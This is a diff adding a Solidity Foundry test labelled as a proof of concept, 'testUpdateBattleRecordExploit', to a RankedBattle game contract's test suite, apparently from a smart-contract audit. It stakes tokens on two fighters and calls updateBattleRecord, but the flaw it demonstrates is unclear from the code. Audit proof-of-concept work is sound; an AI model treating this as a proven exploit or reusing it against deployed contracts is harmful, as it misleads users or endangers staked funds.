@@ -377,6 +377,30 @@ contract RankedBattleTest is Test {
         assertEq(wins, 1);
     }
 
+    /////////////////////////////////////////////////
+    /////////////////// POC /////////////////////////
+    /////////////////////////////////////////////////
+
+    function testUpdateBattleRecordExploit() public {
+        address player = vm.addr(3);
+        _mintFromMergingPool(player);
+        _mintFromMergingPool(player);
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(10 * 10 ** 18, 0);
+        assertEq(_rankedBattleContract.amountStaked(0), 10 * 10 ** 18);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(5 * 10 ** 18, 1);
+        assertEq(_rankedBattleContract.amountStaked(1), 5 * 10 ** 18);
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(0, 50, 0, 1520, true);
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(1, 50, 2, 1500, true);
+        vm.expectRevert();
+        _rankedBattleContract.updateBattleRecord(0, 50, 2, 1480, true);
+        assertEq(_rankedBattleContract.accumulatedPointsPerAddress(player, 0) > 0, true);
+    }
+
     /// @notice Test a player staking NRN. Battle result is a tie. After battle check to see the amount of battled tied is accurate.
     function testUpdateBattleRecordPlayerTiedBattle() public {
         address player = vm.addr(3);
